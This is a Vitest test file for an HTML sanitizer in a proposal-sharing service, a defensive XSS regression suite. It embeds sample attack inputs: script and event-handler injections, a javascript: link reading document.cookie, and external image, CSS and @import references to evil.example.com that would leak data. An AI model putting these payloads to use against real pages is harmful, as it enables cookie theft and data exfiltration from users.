import { describe, it, expect } from "vitest";

import { sanitizeProposalHtml } from "../../src/services/proposal-sanitize.js";

/**
 * adj-200.2.3 — SECURITY-CRITICAL. These documents are served to UNAUTHENTICATED
 * viewers via GET /p/:token, so the sanitizer is the load-bearing boundary. The
 * suite below is a regression gate: every known XSS / external-resource vector must
 * be neutralized, while legitimate semantic + self-contained content survives.
 */
describe("sanitizeProposalHtml", () => {
  describe("XSS regression suite (must neutralize)", () => {
    it("should strip <script> tags and their contents", () => {
      const out = sanitizeProposalHtml(`<p>ok</p><script>alert('xss')</script>`);
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toContain("alert");
      expect(out).toContain("ok");
    });

    it("should strip on* event handler attributes (onerror, onclick, onload)", () => {
      const out = sanitizeProposalHtml(
        `<img src="data:image/png;base64,iVBORw0KGgo=" onerror="alert(1)">` +
          `<div onclick="steal()" onload="boom()">hi</div>`,
      );
      expect(out.toLowerCase()).not.toContain("onerror");
      expect(out.toLowerCase()).not.toContain("onclick");
      expect(out.toLowerCase()).not.toContain("onload");
      expect(out).not.toContain("alert");
      expect(out).not.toContain("steal");
      // data: image src is legitimate and must survive
      expect(out).toMatch(/data:image\/png/);
    });

    it("should strip javascript: URLs in href", () => {
      const out = sanitizeProposalHtml(`<a href="javascript:alert(document.cookie)">click</a>`);
      expect(out.toLowerCase()).not.toContain("javascript:");
      expect(out).not.toContain("alert");
      expect(out).toContain("click"); // link text preserved
    });

    it("should strip external <img src> (exfiltration / tracking pixel)", () => {
      const out = sanitizeProposalHtml(`<img src="https://evil.example.com/pixel.png?c=secret">`);
      expect(out).not.toContain("evil.example.com");
      expect(out).not.toMatch(/src=["']https?:/i);
    });

    it("should strip protocol-relative <img src>", () => {
      const out = sanitizeProposalHtml(`<img src="//evil.example.com/p.png">`);
      expect(out).not.toContain("evil.example.com");
    });

    it("should strip <script> nested inside <svg> (SVG-borne script)", () => {
      const out = sanitizeProposalHtml(`<svg><script>alert('svg')</script><path d="M0 0"/></svg>`);
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toContain("alert");
      expect(out).toMatch(/<svg/i); // the svg itself survives
      expect(out).toMatch(/<path/i);
    });

    it("should strip <iframe>, <object>, and <embed>", () => {
      const out = sanitizeProposalHtml(
        `<iframe src="https://evil.example.com"></iframe>` +
          `<object data="evil.swf"></object>` +
          `<embed src="evil.swf">`,
      );
      expect(out).not.toMatch(/<iframe/i);
      expect(out).not.toMatch(/<object/i);
      expect(out).not.toMatch(/<embed/i);
      expect(out).not.toContain("evil.example.com");
    });

    it("should neutralize external url() in inline style (CSS exfiltration)", () => {
      const out = sanitizeProposalHtml(
        `<div style="background-image:url('https://evil.example.com/bg.png')">x</div>`,
      );
      expect(out).not.toContain("evil.example.com");
    });

    it("should neutralize external url() and @import inside a <style> block", () => {
      const out = sanitizeProposalHtml(
        `<style>@import url("https://evil.example.com/a.css"); body{background:url(https://evil.example.com/b.png)}</style>`,
      );
      expect(out).not.toContain("evil.example.com");
    });

    it("should neutralize CSS expression() (legacy IE vector)", () => {
      const out = sanitizeProposalHtml(`<div style="width:expression(alert(1))">x</div>`);
      expect(out.toLowerCase()).not.toContain("expression(");
    });

    it("should strip javascript: inside CSS url()", () => {
      const out = sanitizeProposalHtml(`<div style="background:url(javascript:alert(1))">x</div>`);
      expect(out.toLowerCase()).not.toContain("javascript:");
    });

    it("should reject non-image data: URIs in <img src> (e.g. data:text/html)", () => {
      const out = sanitizeProposalHtml(`<img src="data:text/html,<script>alert(1)</script>">`);
      expect(out).not.toContain("text/html");
      expect(out.toLowerCase()).not.toContain("alert");
    });

    it("should strip case-varied <SCRIPT> tags", () => {
      const out = sanitizeProposalHtml(`<SCRIPT>alert(1)</SCRIPT><ScRiPt>alert(2)</ScRiPt>`);
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toContain("alert");
    });

    it("should strip <script> and external refs nested inside an SVG anchor", () => {
      const out = sanitizeProposalHtml(
        `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
      );
      expect(out.toLowerCase()).not.toContain("javascript:");
      expect(out).not.toContain("alert");
    });
  });

  describe("allowed content (must survive)", () => {
    it("should keep semantic headings, lists, tables, code/pre, and blockquote", () => {
      const input =
        `<h1>Title</h1><h2>Sub</h2>` +
        `<ul><li>one</li></ul><ol><li>two</li></ol>` +
        `<table><thead><tr><th>H</th></tr></thead><tbody><tr><td>C</td></tr></tbody></table>` +
        `<pre><code>const x = 1;</code></pre>` +
        `<blockquote>quote</blockquote>`;
      const out = sanitizeProposalHtml(input);
      for (const tag of ["h1", "h2", "ul", "li", "ol", "table", "thead", "th", "td", "pre", "code", "blockquote"]) {
        expect(out).toMatch(new RegExp(`<${tag}[ >]`, "i"));
      }
      expect(out).toContain("const x = 1;");
    });

    it("should keep inline style attributes (non-external)", () => {
      const out = sanitizeProposalHtml(`<p style="color:red;font-weight:bold">styled</p>`);
      expect(out).toMatch(/style=/i);
      expect(out).toContain("color:red");
    });

    it("should keep a <style> block with self-contained CSS", () => {
      const out = sanitizeProposalHtml(`<style>.doc h1 { color: #222; }</style><h1 class="doc">x</h1>`);
      expect(out).toMatch(/<style/i);
      expect(out).toContain("color: #222");
    });

    it("should keep inline SVG with drawing children and attributes", () => {
      const out = sanitizeProposalHtml(
        `<svg viewBox="0 0 10 10"><rect x="0" y="0" width="10" height="10" fill="#abc"/><path d="M0 0L10 10" stroke="black"/></svg>`,
      );
      expect(out).toMatch(/<svg[ >]/i);
      expect(out).toMatch(/<rect[ >]/i);
      expect(out).toMatch(/<path[ >]/i);
      expect(out).toMatch(/viewBox=/);
      expect(out).toContain("M0 0L10 10");
    });

    it("should keep <img> with a data: URI", () => {
      const dataUri = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
      const out = sanitizeProposalHtml(`<img src="${dataUri}" alt="dot">`);
      expect(out).toContain("data:image/png;base64");
      expect(out).toContain('alt="dot"');
    });

    it("should keep http, https, and mailto links", () => {
      const out = sanitizeProposalHtml(
        `<a href="https://example.com">h</a><a href="http://example.com">i</a><a href="mailto:a@b.com">m</a>`,
      );
      expect(out).toContain('href="https://example.com"');
      expect(out).toContain('href="http://example.com"');
      expect(out).toContain('href="mailto:a@b.com"');
    });
  });

  describe("edge cases", () => {
    it("should return an empty string for empty input", () => {
      expect(sanitizeProposalHtml("")).toBe("");
    });

    it("should return a string (never throw) for malformed html", () => {
      const out = sanitizeProposalHtml("<div><span>unclosed");
      expect(typeof out).toBe("string");
    });
  });
});
